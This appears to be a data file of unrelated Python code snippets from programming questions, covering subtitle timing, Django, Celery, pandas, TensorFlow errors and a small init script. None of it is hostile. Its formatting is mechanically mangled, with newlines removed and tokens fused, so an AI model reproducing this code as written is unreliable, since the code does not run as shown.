< ! DOCTYPE html PUBLIC `` -//W3C//DTD XHTML 1.0 Strict//EN '' `` http : //www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd '' > < html > < head > < style type= '' text/css '' media= '' screen '' > .a { color : red ; } p { font-size : 12px ; } < /style > < /head > < body > < p class= '' a '' > Lorem Ipsum < /p > < div class= '' a '' > < p > Oh hai < /p > < /div > < /body > < /html > < ! DOCTYPE html PUBLIC `` -//W3C//DTD XHTML 1.0 Strict//EN '' `` http : //www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd '' > < html > < body > < p style= '' color : red ; font-size : 12px ; '' > Lorem Ipsum < /p > < div style= '' color : red ; '' > < p style= '' font-size : 12px ; '' > Oh hai < /p > < /div > < /body > < /html >
"# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -import pysrtimport refrom datetime import datetime , date , time , timedelta # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -def convert_subtitle_one_sentence ( file_name ) : sub = pysrt.open ( file_name ) # # # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # # # Store Each Word and the Average Time it Takes to Say it in a dictionary # # # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- dict_times_word_subtitle = { } running_variable = 0 for i in range ( len ( sub ) ) : subtitle_text = sub [ i ] .text subtitle_duration = ( datetime.combine ( date.min , sub [ i ] .duration.to_time ( ) ) - datetime.min ) .total_seconds ( ) # Compute characters per second characters_per_second = len ( subtitle_text ) /subtitle_duration # Store Each Word and the Average Time ( seconds ) it Takes to Say in a Dictionary for j , word in enumerate ( subtitle_text.split ( ) ) : if j == len ( subtitle_text.split ( ) ) -1 : time = len ( word ) /characters_per_second else : time = len ( word+ '' `` ) /characters_per_second dict_times_word_subtitle [ str ( running_variable ) ] = [ word , time ] running_variable += 1 # # # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # # # Store Each Sentence and the Average Time to Say it in a Dictionary # # # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- total_number_of_words = len ( dict_times_word_subtitle.keys ( ) ) # Get the entire text entire_text = `` '' for i in range ( total_number_of_words ) : entire_text += dict_times_word_subtitle [ str ( i ) ] [ 0 ] + '' `` # Initialize the dictionary dict_times_sentences_subtitle = { } # Loop through all found sentences last_number_of_words = 0 for i , sentence in enumerate ( re.findall ( r ' ( [ A-Z ] [ ^\. ! ? ] * [ \. ! ? ] ) ' , entire_text ) ) : number_of_words = len ( sentence.split ( ) ) # Compute the time it takes to speak the sentence time_sentence = 0 for j in range ( last_number_of_words , last_number_of_words + number_of_words ) : time_sentence += dict_times_word_subtitle [ str ( j ) ] [ 1 ] # Store the sentence together with the time it takes to say the sentence dict_times_sentences_subtitle [ str ( i ) ] = [ sentence , round ( time_sentence,3 ) ] # # Update last number_of_words last_number_of_words += number_of_words # Check if there is a non-sentence remaining at the end if j < total_number_of_words : remaining_string = `` '' remaining_string_time = 0 for k in range ( j+1 , total_number_of_words ) : remaining_string += dict_times_word_subtitle [ str ( k ) ] [ 0 ] + `` `` remaining_string_time += dict_times_word_subtitle [ str ( k ) ] [ 1 ] dict_times_sentences_subtitle [ str ( i+1 ) ] = [ remaining_string , remaining_string_time ] # # # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # # # Create a new Subtitle file with only 1 sentence at a time # # # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # Initalize new srt file new_srt = pysrt.SubRipFile ( ) # Loop through all sentence # get initial start time ( seconds ) # https : //stackoverflow.com/questions/44823073/convert-datetime-time-to-seconds start_time = ( datetime.combine ( date.min , sub [ 0 ] .start.to_time ( ) ) - datetime.min ) .total_seconds ( ) for i in range ( len ( dict_times_sentences_subtitle.keys ( ) ) ) : sentence = dict_times_sentences_subtitle [ str ( i ) ] [ 0 ] print ( sentence ) time_sentence = dict_times_sentences_subtitle [ str ( i ) ] [ 1 ] print ( time_sentence ) item = pysrt.SubRipItem ( index=i , start=pysrt.SubRipTime ( seconds=start_time ) , end=pysrt.SubRipTime ( seconds=start_time+time_sentence ) , text=sentence ) new_srt.append ( item ) # # Update Start Time start_time += time_sentence new_srt.save ( file_name ) srt = `` '' '' 100:00:13,100 -- > 00:00:14,750Dr . Martin Luther King , Jr.,200:00:14,750 -- > 00:00:18,636in a 1968 speech where he reflectsupon the Civil Rights Movement,300:00:18,636 -- > 00:00:21,330states , `` In the end,400:00:21,330 -- > 00:00:24,413we will remember not the words of our enemies500:00:24,413 -- > 00:00:27,280but the silence of our friends . `` 600:00:27,280 -- > 00:00:29,800As a teacher , I 've internalized this message . `` `` '' with open ( 'test.srt ' , `` w '' ) as file : file.write ( srt ) convert_subtitle_one_sentence ( `` test.srt '' ) 000:00:13,100 -- > 00:00:13,336Dr.100:00:13,336 -- > 00:00:14,750Martin Luther King , Jr.200:00:14,750 -- > 00:00:23,514Civil Rights Movement , states , `` In the end , we will remember not the words of our enemies but the silence of our friends.300:00:23,514 -- > 00:00:26,175As a teacher , I 've internalized this message.400:00:26,175 -- > 00:00:29,859our friends . '' As a teacher , I 've internalized this message . sub = pysrt.open ( 'video.srt ' ) running_variable = 0dict_subtitle = { } for i in range ( len ( sub ) ) : # Extract Start Time Stamb timestamb_start = sub [ i ] .start # Extract Text text =sub [ i ] .text # Extract End Time Stamb timestamb_end = sub [ i ] .end # Extract Characters per Second characters_per_second = sub [ i ] .characters_per_second # Fill Dictionary for j , character in enumerate ( `` `` .join ( text.split ( ) ) ) : character_duration = len ( character ) *characters_per_second dict_subtitle [ str ( running_variable ) ] = [ character , character_duration , False , False ] if j == 0 : dict_subtitle [ str ( running_variable ) ] = [ character , character_duration , timestamb_start , False ] if j == len ( text ) -1 : dict_subtitle [ str ( running_variable ) ] = [ character , character_duration , False , timestamb_end ] running_variable += 1 400:00:18,856 -- > 00:00:25,904Je rappelle la dÃ©finition de ce qu'est un produit scalaire , < i > dot product < /i > dans < i > â „ Â² < /i > .500:00:24,855 -- > 00:00:30,431Donc je prends deux vecteurs dans < i > â „ Â² < /i > et je dÃ©finis cette opÃ©ration-lÃ , linÃ©aire , < i > u"
> > > class C ( object ) : ... __slots__ = ' x ' ... > > > class D ( C ) : ... pass ... > > > obj = D ( ) > > > obj.x = 'Stored in slots ' > > > obj.__dict__ { } > > > obj.__dict__ [ ' x ' ] = 'stored in __dict__ ' > > > obj.x'Stored in slots '
"# main_blueprint.pymainBlueprint = Blueprint ( 'main ' , __name__ ) @ mainBlueprint.route ( '/ ' ) def index ( lang ) : return `` lang : % '' % lang # application.pyapp.register_blueprint ( mainBlueprint , url_defaults= { 'lang ' : 'en ' } ) app.register_blueprint ( mainBlueprint , url_prefix='/ < lang > ' )"
"# ! /usr/bin/pythonimport osimport sysimport timefrom ctypes import *def SigHUP ( ) : print `` Caught SIGHUP '' return 0def SigCHLD ( ) : print `` Caught SIGCHLD '' return 0SIGFUNC = CFUNCTYPE ( c_int ) SigHUPFunc = SIGFUNC ( SigHUP ) SigCHLDFunc = SIGFUNC ( SigCHLD ) libc = cdll.LoadLibrary ( 'libc.so.0 ' ) libc.signal ( 1 , SigHUPFunc ) # 1 = SIGHUPlibc.signal ( 17 , SigCHLDFunc ) # 17 = SIGCHLDprint `` Mounting Proc : % s '' % libc.mount ( None , `` /proc '' , `` proc '' , 0 , None ) print `` forking for ash '' cpid = os.fork ( ) if cpid == 0 : os.closerange ( 0 , 4 ) sys.stdin = open ( '/dev/tty2 ' , ' r ' ) sys.stdout = open ( '/dev/tty2 ' , ' w ' ) sys.stderr = open ( '/dev/tty2 ' , ' w ' ) os.execv ( '/bin/ash ' , ( 'ash ' , ) ) print `` ash started on tty2 '' print `` sleeping '' while True : time.sleep ( 0.01 )"
"from numba import jit @ jitdef f ( x , y ) : # A somewhat trivial example return x + y"
"import timefrom bokeh.objects import GlyphRendererrenderer = [ r for r in curplot ( ) .renderers if isinstance ( r , GlyphRenderer ) ] [ 0 ] ds = renderer.data_sourcewhile True : df = pd.io.json.read_json ( url+json_call ) ds.data [ `` x '' ] = x+N*i ds.data [ `` y '' ] = df.rssi ds._dirty = True session ( ) .store_obj ( ds ) time.sleep ( 1.5 ) i+=1"
"fig1 , ax1 = plt.subplots ( figsize= ( 4,3 ) ) fig2 , ax2 = plt.subplots ( figsize= ( 4,3 ) ) fig3 , ax3 = plt.subplots ( figsize= ( 4,3 ) ) # 1 . This worksdf [ 'speed ' ] .hist ( ) # 2 . This doens't workdf [ 'speed ' ] .hist ( ax=ax2 ) # 3 . This worksdata = [ 1,2,3,5,6,2,3,4 ] temp_df = pd.DataFrame ( data ) temp_df.hist ( ax=ax2 ) AssertionError Traceback ( most recent call last ) < ipython-input-46-d629de832772 > in < module > ( ) 7 8 # This doens't work -- -- > 9 df [ 'speed ' ] .hist ( ax=ax2 ) 10 11 # # This worksD : \Anaconda2\lib\site-packages\pandas\tools\plotting.pyc in hist_series ( self , by , ax , grid , xlabelsize , xrot , ylabelsize , yrot , figsize , bins , **kwds ) 2953 ax = fig.gca ( ) 2954 elif ax.get_figure ( ) ! = fig : - > 2955 raise AssertionError ( 'passed axis not bound to passed figure ' ) 2956 values = self.dropna ( ) .values 2957 AssertionError : passed axis not bound to passed figure"
variable salesvendor date a 2014-01-01 start date 1 2014-03-01 end date 1b 2014-03-01 start date 1 2014-07-01 end date 1 variable salesvendor date a 2014-01-01 start date 1 2014-02-01 NaN 1 2014-03-01 end date 1b 2014-03-01 start date 1 2014-04-01 NaN 1 2014-05-01 NaN 1 2014-06-01 NaN 1 2014-07-01 end date 1
"class List ( list , MutableSequence [ T ] , extra=list ) : . . ."
"import requestsfrom ast import literal_evalimport matplotlib.pyplot as pltimport numpy as np def read_url ( url ) : r = requests.get ( url ) return r.textdef cartesian_to_polar ( x , y ) : rho = np.sqrt ( x**2 + y**2 ) phi = np.arctan2 ( y , x ) return ( rho , phi ) def plot_dendrogram ( icoord , dcoord , figsize , polar=False ) : if polar : icoord , dcoord = cartesian_to_polar ( icoord , dcoord ) with plt.style.context ( `` seaborn-white '' ) : fig = plt.figure ( figsize=figsize ) ax = fig.add_subplot ( 111 , polar=polar ) for xs , ys in zip ( icoord , dcoord ) : ax.plot ( xs , ys , color= '' black '' ) ax.set_title ( f '' Polar= { polar } '' , fontsize=15 ) # Load the dendrogram datastring_data = read_url ( `` https : //pastebin.com/raw/f953qgdr '' ) .replace ( `` \r '' , '' '' ) .replace ( `` \n '' , '' '' ) .replace ( `` \u200b\u200b '' , '' '' ) # Convert it to a dictionary ( a subset of the output from scipy.hierarchy.dendrogram ) dendrogram_data = literal_eval ( string_data ) icoord = np.asarray ( dendrogram_data [ `` icoord '' ] , dtype=float ) dcoord = np.asarray ( dendrogram_data [ `` dcoord '' ] , dtype=float ) # Plot the cartesian versionplot_dendrogram ( icoord , dcoord , figsize= ( 8,3 ) , polar=False ) # Plot the polar versionplot_dendrogram ( icoord , dcoord , figsize= ( 5,5 ) , polar=True ) import matplotlib.transforms as mtransformswith plt.style.context ( `` seaborn-white '' ) : fig , ax = plt.subplots ( figsize= ( 5,5 ) ) for xs , ys in zip ( icoord , dcoord ) : ax.plot ( xs , ys , color= '' black '' , transform=trans_offset ) ax_polar = plt.subplot ( 111 , projection='polar ' ) trans_offset = mtransforms.offset_copy ( ax_polar.transData , fig=fig ) for xs , ys in zip ( icoord , dcoord ) : ax_polar.plot ( xs , ys , color= '' black '' , transform=trans_offset )"
"from distutils.core import setupimport py2exesetup ( console= [ 'PyVersionControl.py ' ] ) Microsoft Windows [ Version 6.1.7601 ] Copyright ( c ) 2009 Microsoft Corporation . All rights reserved.C : \Users\chdick > python setup.py py2exerunning py2exe 3 missing Modules -- -- -- -- -- -- -- -- -- ? readline imported from cmd , code , pdb ? win32api imported from platform ? win32con imported from platformBuilding 'dist\PyVersionControl.exe'.Building shared code archive 'dist\library.zip'.Copy c : \windows\system32\python34.dll to distCopy C : \Python34\DLLs\pyexpat.pyd to dist\pyexpat.pydCopy C : \Python34\DLLs\_ctypes.pyd to dist\_ctypes.pydCopy C : \Python34\DLLs\unicodedata.pyd to dist\unicodedata.pydCopy C : \Python34\DLLs\_hashlib.pyd to dist\_hashlib.pydCopy C : \Python34\DLLs\_socket.pyd to dist\_socket.pydCopy C : \Python34\DLLs\_tkinter.pyd to dist\_tkinter.pydCopy C : \Python34\DLLs\_bz2.pyd to dist\_bz2.pydCopy C : \Python34\DLLs\select.pyd to dist\select.pydCopy C : \Python34\DLLs\_ssl.pyd to dist\_ssl.pydCopy C : \Python34\DLLs\_lzma.pyd to dist\_lzma.pydCopy DLL C : \Python34\DLLs\tk86t.dll to dist\Copy DLL C : \Python34\DLLs\tcl86t.dll to dist\C : \Users\chdick >"
"> > > import scipy > > > x = [ 5.05 , 6.75 , 3.21 , 2.66 ] > > > y = [ 1.65 , 26.5 , -5.93 , 7.96 ] > > > z = [ 1.65 , 2.64 , 2.64 , 6.95 ] > > > print scipy.stats.stats.kendalltau ( x , y ) [ 0 ] 0.333333333333 A = pd.DataFrame ( [ [ 1 , 5 , 1 ] , [ 2 , 4 , 1 ] , [ 3 , 3 , 1 ] , [ 4 , 2 , 1 ] , [ 5 , 1 , 1 ] ] , columns= [ ' A ' , ' B ' , ' C ' ] , index = [ 1 , 2 , 3 , 4 , 5 ] ) In [ 1 ] : function ( A , 3 ) # A is df , 3 is the rolling windowOut [ 2 ] : A B C AB AC BC 1 1 5 2 NaN NaN NaN2 2 4 4 NaN NaN NaN3 3 3 1 -0.99 -0.33 0.334 4 2 2 -0.99 -0.33 0.335 5 1 4 -0.99 0.99 -0.99 def tau1 ( x ) : y = np.array ( A [ ' A ' ] ) # keep one column fix and run it in the other two tau , p_value = sp.stats.kendalltau ( x , y ) return tau A [ 'AB ' ] = pd.rolling_apply ( A [ ' B ' ] , 3 , lambda x : tau1 ( x ) ) ValueError : all keys need to be the same shape"
"def first ( ( a , b ) ) : return ax = ( 4 , 9 ) first ( x ) li = [ ( 5 , 4 ) , ( 8 , 9 ) ] map ( first , li ) def second ( a , b ) : # does not work the same way return b"
"def partitions ( set_ ) : if not set_ : yield [ ] return for i in xrange ( 2**len ( set_ ) /2 ) : parts = [ set ( ) , set ( ) ] for item in set_ : parts [ i & 1 ] .add ( item ) i > > = 1 for b in partitions ( parts [ 1 ] ) : yield [ parts [ 0 ] ] +bfor p in partitions ( [ `` a '' , `` b '' , `` c '' , `` d '' ] ) : print ( p ) def partitions ( set ) if not set yield [ ] return end ( 0 ... 2**set.size/2 ) .each { |i| parts = [ Set.new , Set.new ] set.each { |item| parts [ i & 1 ] < < item i > > = 1 } partitions ( parts [ 1 ] ) .each { |b| yield [ parts [ 0 ] ] < < b } } endp partitions ( [ 1 , 2 , 3 , 4 ] .to_set )"
"> > tf.Variable ( 2 , name= ' a ' ) < tf.Variable 'finegrained_1/decoder/unreadable/a:0 ' shape= ( ) dtype=int32_ref > > > tf.Variable ( 2 , name= ' a : b ' ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -ValueError Traceback ( most recent call last ) ~/mm/appy-finegrained/sign_classification/model_finegrained.py in < module > ( ) -- -- > 1 tf.Variable ( 2 , name= ' a : b ' ) ~/anaconda3/lib/python3.6/site-packages/tensorflow/python/ops/variables.py in __init__ ( self , initial_value , trainable , collections , validate_shape , caching_device , name , variable_def , dtype , expected_shape , import_scope , constraint ) 211 dtype=dtype , 212 expected_shape=expected_shape , -- > 213 constraint=constraint ) 214 215 def __repr__ ( self ) : ~/anaconda3/lib/python3.6/site-packages/tensorflow/python/ops/variables.py in _init_from_args ( self , initial_value , trainable , collections , validate_shape , caching_device , name , dtype , expected_shape , constraint ) 287 with ops.control_dependencies ( None ) : 288 with ops.name_scope ( name , `` Variable '' , [ ] if init_from_fn else -- > 289 [ initial_value ] ) as name : 290 291 if init_from_fn : ~/anaconda3/lib/python3.6/site-packages/tensorflow/python/framework/ops.py in __enter__ ( self ) 4930 self._g_manager.__enter__ ( ) 4931 self._name_scope = g.name_scope ( self._name ) - > 4932 return self._name_scope.__enter__ ( ) 4933 4934 def __exit__ ( self , type_arg , value_arg , traceback_arg ) : ~/anaconda3/lib/python3.6/contextlib.py in __enter__ ( self ) 79 def __enter__ ( self ) : 80 try : -- - > 81 return next ( self.gen ) 82 except StopIteration : 83 raise RuntimeError ( `` generator did n't yield '' ) from None~/anaconda3/lib/python3.6/site-packages/tensorflow/python/framework/ops.py in name_scope ( self , name ) 3512 # ( viz . '- ' , '\ ' , '/ ' , and ' _ ' ) . 3513 if not _VALID_SCOPE_NAME_REGEX.match ( name ) : - > 3514 raise ValueError ( `` ' % s ' is not a valid scope name '' % name ) 3515 else : 3516 # Scopes created in the root must match the more restrictiveValueError : ' a : b ' is not a valid scope name > > tf.Variable ( 2 , name= ' a/b ' ) < tf.Variable 'finegrained_1/decoder/unreadable/a/b:0 ' shape= ( ) dtype=int32_ref >"
"class TreeWidgetItem ( QtGui.QTreeWidgetItem ) : def __lt__ ( self , other ) : column = self.treeWidget ( ) .sortColumn ( ) key1 = self.text ( column ) key2 = other.text ( column ) return self.natural_sort_key ( key1 ) < self.natural_sort_key ( key2 ) @ staticmethod def natural_sort_key ( key ) : regex = ' ( \d*\.\d+|\d+ ) ' parts = re.split ( regex , key ) return tuple ( ( e if i % 2 == 0 else float ( e ) ) for i , e in enumerate ( parts ) ) import sysimport refrom PySide import QtGui , QtCoredata = [ { `` name '' : `` Apple '' , `` alpha_numeric '' : `` 11 '' } , { `` name '' : `` Apple '' , `` alpha_numeric '' : `` 125b '' } , { `` name '' : `` Apple '' , `` alpha_numeric '' : `` 125a '' } , { `` name '' : `` Apple '' , `` alpha_numeric '' : `` 3 '' } , { `` name '' : `` Orange '' , `` alpha_numeric '' : `` 11 '' } , { `` name '' : `` Orange '' , `` alpha_numeric '' : `` 125b '' } , { `` name '' : `` Orange '' , `` alpha_numeric '' : `` 125a '' } , { `` name '' : `` Orange '' , `` alpha_numeric '' : `` 3 '' } , ] # re-implement the QTreeWidgetItemclass TreeWidgetItem ( QtGui.QTreeWidgetItem ) : def __lt__ ( self , other ) : column = self.treeWidget ( ) .sortColumn ( ) key1 = self.text ( column ) key2 = other.text ( column ) return self.natural_sort_key ( key1 ) < self.natural_sort_key ( key2 ) @ staticmethod def natural_sort_key ( key ) : regex = ' ( \d*\.\d+|\d+ ) ' parts = re.split ( regex , key ) return tuple ( ( e if i % 2 == 0 else float ( e ) ) for i , e in enumerate ( parts ) ) class MainWindow ( QtGui.QMainWindow ) : def __init__ ( self ) : super ( MainWindow , self ) .__init__ ( ) self.resize ( 300 , 300 ) self.table = None self.ui ( ) def ui ( self ) : # setup the table self.table = QtGui.QTreeWidget ( ) self.table.setRootIsDecorated ( False ) self.table.setAlternatingRowColors ( True ) self.table.setSortingEnabled ( True ) # columns and widths column_names = [ 'Name ' , 'Alpha Numeric ' ] self.table.setColumnCount ( 2 ) self.table.setColumnWidth ( 0 , 150 ) self.table.setColumnWidth ( 1 , 150 ) self.table.setHeaderLabels ( column_names ) # row data for row in data : column = TreeWidgetItem ( self.table ) column.setSizeHint ( 0 , QtCore.QSize ( 30 , 30 ) ) column.setText ( 0 , row [ 'name ' ] ) column.setText ( 1 , row [ 'alpha_numeric ' ] ) # sort self.table.sortByColumn ( 1 , QtCore.Qt.AscendingOrder ) self.table.sortByColumn ( 0 , QtCore.Qt.AscendingOrder ) # setup the layout self.setCentralWidget ( self.table ) if __name__ == '__main__ ' : app = QtGui.QApplication ( sys.argv ) window = MainWindow ( ) window.show ( ) sys.exit ( app.exec_ ( ) )"
"def scrabble_score ( word , scoretable ) : score = 0 for letter in word : if letter in scoretable : score += scoretable [ letter ] return score def scrabble_score ( word , scoretable ) : return sum ( [ scoretable.get ( x , 0 ) for x in word ] )"
raw = win32com.client.Dispatch ( `` MyLib.MyClass '' ) acq_time = raw.GetCreationDate ( )
for x in it : pass list ( it )
# request_vars.pyglobal_vars = threading.local ( ) # another.pyfrom request_vars import global_varsget_time ( ) : return global_vars.time_start # main.pyimport anotherfrom request_vars import global_varsglobal_vars.time_start = datetime.datetime.now ( ) time_start = another.get_time ( )
"from .tasks import upload_task ... upload_task.delay ( datapoints , user , description ) # datapoints is a list of dictionaries , user and description are simple strings from taskman.celery import app , DBTask # taskman is the name of the Django app that has celery.pyfrom celery import task , current_task @ task ( base=DBTask ) def upload_task ( datapoints , user , description ) : from utils.db.databaseinserter import insertIntoDatabase for count in insertIntoDatabase ( datapoints , user , description ) : percent_completion = int ( 100 * ( float ( count ) / float ( len ( datapoints ) ) ) ) current_task.update_state ( state='PROGRESS ' , meta= { 'percent ' : percent_completion } ) def insertIntoDatabase ( datapoints , user , description ) : # iterate through the datapoints and upload them one by one # at the end of an iteration , yield the number of datapoints completed so far from django.contrib import messages ... messages.info ( request , `` Upload is in progress '' ) messages.info ( request , `` Upload successful ! '' ) def poll_state ( request ) : data = 'Failure ' if request.is_ajax ( ) : if 'task_id ' in request.POST.keys ( ) and request.POST [ 'task_id ' ] : task_id = request.POST [ 'task_id ' ] task = AsyncResult ( task_id ) data = task.result or task.state if data == 'SUCCESS ' or data == 'FAILURE ' : # not sure what to do here ; what I want is to exit the function early if the current task is already completed return HttpResponse ( { } , content_type='application/json ' ) else : data ='No task_id in the request ' logger.info ( 'No task_id in the request ' ) else : data = 'Not an ajax request ' logger.info ( 'Not an ajax request ' ) json_data = json.dumps ( data ) return HttpResponse ( json_data , content_type='application/json ' ) { % if task_id % } jQuery ( document ) .ready ( function ( ) { var PollState = function ( task_id ) { jQuery.ajax ( { url : `` poll_state '' , type : `` POST '' , data : `` task_id= '' + task_id , } ) .done ( function ( task ) { if ( task.percent ) { jQuery ( '.bar ' ) .css ( { 'width ' : task.percent + ' % ' } ) ; jQuery ( '.bar ' ) .html ( task.percent + ' % ' ) ; } else { jQuery ( '.status ' ) .html ( task ) ; } ; PollState ( task_id ) ; } ) ; } PollState ( ' { { task_id } } ' ) ; } ) { % endif % }"
"-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -ValueError Traceback ( most recent call last ) < ipython-input-5-0fbff9b56a9d > in < module > ( ) 1 model.save ( 'model.h5 ' ) 2 del model -- -- > 3 model = tf.keras.models.load_model ( 'model.h5 ' ) 8 frames/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/utils/generic_utils.py in class_and_config_for_serialized_keras_object ( config , module_objects , custom_objects , printable_module_name ) 319 cls = get_registered_object ( class_name , custom_objects , module_objects ) 320 if cls is None : -- > 321 raise ValueError ( 'Unknown ' + printable_module_name + ' : ' + class_name ) 322 323 cls_config = config [ 'config ' ] ValueError : Unknown layer : CustomLayer class CustomLayer ( tf.keras.layers.Layer ) : def __init__ ( self , k , name=None ) : super ( CustomLayer , self ) .__init__ ( name=name ) self.k = k def get_config ( self ) : return { ' k ' : self.k } def call ( self , input ) : return tf.multiply ( input , 2 ) model = tf.keras.models.Sequential ( [ tf.keras.Input ( name='input_layer ' , shape= ( 10 , ) ) , CustomLayer ( 10 , name='custom_layer ' ) , tf.keras.layers.Dense ( 1 , activation='sigmoid ' , name='output_layer ' ) ] ) model.save ( 'model.h5 ' ) model = tf.keras.models.load_model ( 'model.h5 ' )"
import mymoduleprint mymodule
"> > > in_str = 'a3b2Foobar ' > > > ( int ( hashlib.sha256 ( in_str.encode ( ) ) .hexdigest ( ) , 16 ) % 1e8 ) / 1e80.40341504"
"import timefrom threading import Threadfrom multiprocessing import Process def fun1 ( ) : for _ in xrange ( 10000000 ) : print 'in fun1 ' passdef fun2 ( ) : for _ in xrange ( 10000000 ) : print 'in fun2 ' passdef fun3 ( ) : for _ in xrange ( 10000000 ) : print 'in fun3 ' passdef fun4 ( ) : for _ in xrange ( 10000000 ) : print 'in fun4 ' passif __name__ == '__main__ ' : # t1 = Thread ( target=fun1 , args= ( ) ) t1 = Process ( target=fun1 , args= ( ) ) # t2 = Thread ( target=fun2 , args= ( ) ) t2 = Process ( target=fun2 , args= ( ) ) # t3 = Thread ( target=fun3 , args= ( ) ) t3 = Process ( target=fun3 , args= ( ) ) # t4 = Thread ( target=fun4 , args= ( ) ) t4 = Process ( target=fun4 , args= ( ) ) t1.start ( ) t2.start ( ) t3.start ( ) t4.start ( ) start = time.clock ( ) t1.join ( ) t2.join ( ) t3.join ( ) t4.join ( ) end = time.clock ( ) print ( `` Time Taken = `` , end-start ) `` ' start = time.clock ( ) fun1 ( ) fun2 ( ) fun3 ( ) fun4 ( ) end = time.clock ( ) print ( `` Time Taken = `` , end-start ) `` '"
"import osimport stringfrom PIL import Imagefrom PIL import ImageFont , ImageDraw , ImageOpswidth , height = 100 , 100text = ' H'font_size = 100os.makedirs ( './ { } '.format ( text ) , exist_ok=True ) img = Image.new ( `` L '' , ( width , height ) , color=0 ) # `` L '' : ( 8-bit pixels , black and white ) font = ImageFont.truetype ( `` arial.ttf '' , font_size ) draw = ImageDraw.Draw ( img ) w , h = draw.textsize ( text , font=font ) draw.text ( ( ( width-w ) /2 , ( height-h ) /2 ) , text=text , fill='white ' , font=font ) img.save ( ' H.png ' )"
[ Box ] box.active = falseresolution_tracker.active = truebox.api_key = box.api_secret = box.job_interval = 480box.max_attempts = 6box.users = [ Google ] google.active = truegoogle.job_interval = 480google.users = < useremail > google.key_file_name = < key_file > google.service_account_id = < account_id > box.active = false box.active=false
"import pandas as pdimport seaborn as snsimport matplotlib.dates as mdatesfrom datetime import timedata = [ ] for i in range ( 0 , 24 ) : temp_list = [ ] temp_list.append ( time ( i ) ) temp_list.append ( i ) data.append ( temp_list ) my_df = pd.DataFrame ( data , columns= [ `` time '' , `` values '' ] ) my_df.set_index ( [ 'time ' ] , inplace=True ) my_dffig = sns.scatterplot ( my_df.index , my_df [ 'values ' ] ) fig.set ( xlabel='time ' , ylabel='values ' )"
"[ { `` id '' : `` 0038 '' , `` name '' : `` Jane Doe '' , `` total_hrs_per_week '' : 6 , `` timezone '' : `` America/Los_Angeles '' } , { `` id '' : `` 0039 '' , `` name '' : `` John Doe '' , `` total_hrs_per_week '' : 10 , `` timezone '' : `` America/Los_Angeles '' } ] { `` people '' : [ { `` id '' : `` 0038 '' , `` name '' : `` Jane Doe '' , `` total_hrs_per_week '' : 6 , `` timezone '' : `` America/Los_Angeles '' } , { `` id '' : `` 0039 '' , `` name '' : `` John Doe '' , `` total_hrs_per_week '' : 10 , `` timezone '' : `` America/Los_Angeles '' } ] } class PeopleListSerializer ( serializers.ModelSerializer ) : id = serializers.CharField ( source='id ' ) name =serializers.CharField ( source='name ' ) total_hrs_per_week = serializers.IntegerField ( source='total_hrs_per_week ' ) timezone = serializers.CharField ( source='timezone ' ) class Meta : model = models.Person fields = ( 'id ' , 'name ' , 'total_hrs_per_week ' , 'timezone ' ) class PeopleListWrapperSerializer ( serializers.Serializer ) : people = PeopleListSerializer ( many=True ) class Meta : fields = [ 'people ' ]"
./manage.py migrate myapp 0006_f ./manage.py migrate myapp 0006_f./manage.py migrate myapp 0004_d1
for foo in Foo.objects.all ( ) : if foo.id % K == N : print foo
Starting highest and lowest keys : '000 ' 'FFF ' / \ / \ '000 ' ' 8 ' ' 8 ' 'FFF ' / \ / \ / \ / \Result : '000 ' ' 4 ' ' 4 ' ' 8 ' ' 8 ' 'B8 ' 'B8 ' 'FFF ' ( After 3 levels of recursion )
"class Artist ( models.Model ) : gid = models.CharField ( max_length=63 , blank=True ) name = models.CharField ( max_length=255 , blank=True ) begin_life = models.CharField ( max_length=31 , blank=True ) end_life = models.CharField ( max_length=31 , blank=True ) type = models.CharField ( max_length=1 , blank=True ) gender = models.CharField ( max_length=1 , blank=True ) class Song ( models.Model ) : gid = models.CharField ( max_length=63 , blank=True ) title = models.CharField ( max_length=255 , blank=True ) artist = models.ForeignKey ( 'Artist ' , related_name='songs_artist ' ) album = models.ForeignKey ( 'Album ' , related_name='songs_album ' ) length = models.IntegerField ( default=0 ) class ArtistSerializer ( serializers.ModelSerializer ) : songs_artist = SongSerializer ( source='songs_artist ' ) class Meta : model = Artist fields = ( 'name ' , 'type ' , 'gender ' , 'begin_life ' , 'end_life ' , 'songs_artist ' ) class SongSerializer ( serializers.ModelSerializer ) : artist = SongArtistSerializer ( ) album = SongAlbumSerializer ( ) class Meta : model = Song fields = ( 'id ' , 'title ' , 'artist ' , 'album ' , 'length ' ) class SongArtistSerializer ( serializers.ModelSerializer ) : class Meta : model = Artist fields = ( 'id ' , 'name ' )"
"[ 2,3,1,0 ] [ 0,0,2,1 ] [ 2,1,3,0 ] [ 0,0,1,2 ] for i in range ( len ( X ) ) : np.random.shuffle ( X [ i , : ] ) for i in range ( len ( X ) ) : np.random.shuffle ( X [ i , np.nonzero ( X [ i , : ] ) ] ) In [ 30 ] : X [ i , np.nonzero ( X [ i , : ] ) ] Out [ 30 ] : array ( [ [ 23 , 5 , 29 , 11 , 17 ] ] ) In [ 31 ] : X [ i , : ] Out [ 31 ] : array ( [ 23 , 5 , 29 , 11 , 17 ] )"
